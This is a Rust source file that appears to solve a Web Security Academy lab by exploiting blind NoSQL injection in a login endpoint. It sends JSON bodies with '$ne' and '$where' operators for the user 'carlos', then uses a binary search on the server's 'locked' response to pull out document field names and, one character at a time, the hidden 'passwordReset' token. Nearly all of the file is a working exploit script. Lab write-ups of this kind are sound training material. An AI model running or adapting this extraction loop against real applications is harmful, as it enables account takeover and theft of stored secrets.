mod level;
mod macros;

use crate::level::Level;

async fn check(
    client: &reqwest::Client,
    payload: &str,
    debug: bool,
) -> Result<bool, reqwest::Error> {
    let response = client
        .post("https://0adc0065033cde87829f1a0f00ce0071.web-security-academy.net/login")
        .header("Content-Type", "application/json")
        .body(format!(
            r#"{{"username":"carlos","password":{{"$ne":"invalid"}},"$where": "{}"}}"#,
            payload
        ))
        .send()
        .await?;
    let status = response.status().as_u16();
    let body = response.text().await?;
    let success = body.contains("locked");
    dbg_print!(debug, "({})  {}  ==>  {}", status, payload, success);
    Ok(success)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // // test single run
    // println!("result: {}", Level::test(218, 255, true));

    // // test batch
    // let mut failed: u8 = 0;
    // for needle in 0..255 {
    //     let result = Level::test(needle, 255, false);
    //     if result != needle {
    //         failed += 1;
    //         println!("needle: {}, result: {}", needle, result)
    //     }
    // }
    // println!("{} failed.", failed);

    let verbose = true;

    // let proxy = reqwest::Proxy::https("http://127.0.0.1:8080")?;
    let client = reqwest::Client::builder()
        // .proxy(proxy)
        .danger_accept_invalid_certs(true)
        .build()?;

    assert_eq!(check(&client, "Object.keys(this)", true).await?, true);
    assert_eq!(
        check(&client, "Object.keys(this).length < 0", false).await?,
        false
    );

    // println!("getting keys count...");
    // let count = {
    //     let mut level = Level::new(255);
    //     loop {
    //         let result = check(
    //             &client,
    //             &format!(
    //                 "Object.keys(this).length {} {}",
    //                 if level.more { ">" } else { "<" },
    //                 level.result
    //             ),
    //             verbose,
    //         )
    //         .await?;
    //         if level.completed(result, false) {
    //             break;
    //         }
    //     }
    //     level.result
    // };
    // println!("keys count: {}", count);

    // for key in 0..count {
    //     println!("getting length of key #{}...", key + 1);
    //     let length = {
    //         let mut level = Level::new(255);
    //         loop {
    //             let result = check(
    //                 &client,
    //                 &format!(
    //                     "Object.keys(this)[{}].length {} {}",
    //                     key,
    //                     if level.more { ">" } else { "<" },
    //                     level.result
    //                 ),
    //                 verbose,
    //             )
    //             .await?;
    //             if level.completed(result, false) {
    //                 break;
    //             }
    //         }
    //         level.result
    //     };
    //     println!("length: {}", length);

    //     println!("getting key #{}...", key + 1);
    //     let mut text = String::new();
    //     for index in 0..length {
    //         let letter = char::from({
    //             let mut level = Level::new(255);
    //             loop {
    //                 let result = check(
    //                     &client,
    //                     &format!(
    //                         "Object.keys(this)[{}].charCodeAt({}) {} {}",
    //                         key,
    //                         index,
    //                         if level.more { ">" } else { "<" },
    //                         level.result
    //                     ),
    //                     verbose,
    //                 )
    //                 .await?;
    //                 if level.completed(result, false) {
    //                     break;
    //                 }
    //             }
    //             level.result
    //         });
    //         println!("{}", letter);
    //         text.push(letter);
    //     }
    //     println!("{}", text);
    // }

    // 0 _id
    // 1 username
    // 2 password
    // 3 email
    // 4 passwordReset

    let key = 4;

    println!("getting length of value #{}...", key + 1);
    let length = {
        let mut level = Level::new(255);
        loop {
            let result = check(
                &client,
                &format!(
                    "this[Object.keys(this)[{}]].length {} {}",
                    key,
                    if level.more { ">" } else { "<" },
                    level.result
                ),
                verbose,
            )
            .await?;
            if level.completed(result, false) {
                break;
            }
        }
        level.result
    };
    println!("length: {}", length);

    println!("getting value #{}...", key + 1);
    let mut text = String::new();
    for index in 0..length {
        let letter = char::from({
            let mut level = Level::new(255);
            loop {
                let result = check(
                    &client,
                    &format!(
                        "this[Object.keys(this)[{}]].charCodeAt({}) {} {}",
                        key,
                        index,
                        if level.more { ">" } else { "<" },
                        level.result
                    ),
                    verbose,
                )
                .await?;
                if level.completed(result, false) {
                    break;
                }
            }
            level.result
        });
        println!("{}", letter);
        text.push(letter);
    }
    println!("{}", text);

    Ok(())
}
